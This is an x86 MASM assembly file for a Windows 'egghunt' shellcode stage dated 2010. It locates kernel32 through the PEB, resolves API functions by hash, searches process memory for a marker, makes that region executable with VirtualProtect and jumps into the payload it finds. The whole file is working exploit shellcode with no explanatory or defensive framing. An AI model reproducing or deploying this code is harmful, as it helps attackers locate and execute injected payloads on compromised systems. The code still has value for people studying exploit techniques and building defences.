; egghunt Stage exec
; (c) 2010, cod@inbox.com

    .586
    .model  flat, stdcall
    option casemap :none        ; case sensitive

PAGE_EXECUTE_READWRITE    equ 40h

.code
    ASSUME  FS:nothing
 
start:
	push	ebp
	mov		ebp, esp
	sub		esp, 40h
	
    db		0e8h
	dd		0ffffffffh
	db		0c8h
bob:
    pop     eax
    sub     eax, $ - 1 - OFFSET start

    mov     ebp, esp
    sub     esp, 40h

	call	get_kernel32
	mov     dword ptr [ebp+8], eax          ; Kernel32
	mov		esi, eax
	
	push	06e824142h
	push	esi
	call	get_procaddr
	mov		dword ptr [ebp-28h], eax
	
	push	07946c61bh
	push	esi
	call	get_procaddr
	mov		dword ptr [ebp-24h], eax
	
	push	0a3c8c8aah
	push	esi
	call	get_procaddr
	mov		dword ptr [ebp-2ch], eax
	
	push	060e0ceefh
	push	esi
	call	get_procaddr
	mov		dword ptr [ebp-30h], eax
	
	jmp		egghuntcore

ExitThread:
	jmp		dword ptr [ebp-30h]
IsBadReadPtr:
	jmp	dword ptr [ebp-28h]
VirtualProtect:
	jmp dword ptr [ebp-24h]
VirtualQuery:
	jmp dword ptr [ebp-2ch]
	
@error:
	;   main core of "EGG-HUNT"
	dd	0cccccccch
egghuntcore:
	xor		ebx, ebx	; ecx contain original address
	
@scanaddr:
	cmp		ebx, 7fff0000h
	JAE 	@error

@scan:
	; ebx is a valid block
	lea		eax, [ebp-20h]
	push	1ch
	push	eax
	push	ebx
	call	VirtualQuery	; get address of information
	cmp		dword ptr [ebp-10h], 1000h	; MEM_COMMIT
	jne		@continue
	bt	dword ptr [ebp-0ch], 8h	; AND
	jb		@continue			; page guard 
	bt	dword ptr [ebp-0ch], 0h	; AND
	jb		@continue			; NO_ACCESS
	mov		edi, dword ptr [ebp-20h]
	mov		ebx, dword ptr [ebp-14h]	; look!
	jmp		@find
	test	eax, eax
	jnz		@found
	; smandruppa
@continue:
	mov		ebx, dword ptr [ebp-20h]	; base address from AllocationBase
	add		ebx, dword ptr [ebp-14h]	; RegionSize
	jmp		@scanaddr					; move on next address

@find:
	cld
	mov		ecx, ebx
	shr		ecx, 2
@next:
	mov		eax, 000000e8h
	repne	scasd
	jnz		@continue
	cmp		dword ptr [edi], 00255800h
	je		@found
	test	ecx, ecx
	jz		@continue
	jmp		@next

@found:
	mov		eax, edi
	push 	eax
	
	lea		eax, [ebp-4h]
	push	eax
	push	PAGE_EXECUTE_READWRITE
	push	2000h
	mov		eax, edi
	and		eax, 0fffff000h
	sub		eax, 1000h
	push	eax
	call	VirtualProtect	; virtual protect!
	pop		eax
	sub		eax, 4
	push	0					; null ptr to getprocaddr
	push	dword ptr [ebp+8]	; kernel32
	; db		0cch
	call	eax
	push	0
	call	ExitThread
	
; looks in module_list L"KERNEL32"
get_kernel32 proc
	xor		ecx, ecx
	mov		esi, fs:[ecx+30h]
	mov		esi, [esi+0ch]
	mov		esi, [esi+1ch]
@loop:	
	mov		ebx, [esi+08h]
	mov		edi, [esi+20h]
	mov		esi, [esi]
	cmp		[edi+18h], cx
	jnz		@loop
	mov		eax, ebx
	retn
get_kernel32 endp

; get proc address
;	ebp+08	-> module
;	ebp+0ch	-> function
get_procaddr proc
	push ebp
	mov	ebp, esp

	push	esi
	push	edi
	push	ecx
	push	ebx
	push	edx
	
	mov     edi, dword ptr [ebp+08h]	; load base address
	mov     eax, dword ptr [edi+3Ch]	; pe ptr
	mov     edx, dword ptr [edi+eax+78h]	; export
	add     edx, edi
	mov     ecx, dword ptr [edx+18h]	; counter EXPORT!
	mov     ebx, dword ptr [edx+20h]	; name EXPORT
	add     ebx, edi

@nextentry:
	jecxz   short @end
	dec     ecx
	mov     esi, [ebx+ecx*4]
	add     esi, dword ptr [ebp+08h]
	xor     edi, edi
	xor     eax, eax
	cld

@ror:
	lodsb
	test    al, al
	jz      short loc_117
	ror     edi, 0Dh
	add     edi, eax
	jmp     short @ror

loc_117:
	cmp     edi, dword ptr [ebp+0ch]	; same dword?
	jnz     short @nextentry
	mov     ebx, dword ptr [edx+24h]
	add     ebx, dword ptr [ebp+08h]
	mov     cx, word ptr [ebx+ecx*2]
	mov     ebx, dword ptr [edx+1Ch]
	add     ebx, dword ptr [ebp+08h]
	mov     eax, dword ptr [ebx+ecx*4]
	add     eax, dword ptr [ebp+08h]

@end:
	pop	edx
	pop ebx
	pop ecx
	pop edi
	pop esi
	mov	esp, ebp
	pop ebp
	ret 8
get_procaddr endp

WinMainCRTStartup PROC
	jmp start
WinMainCRTStartup ENDP
end start
    
	
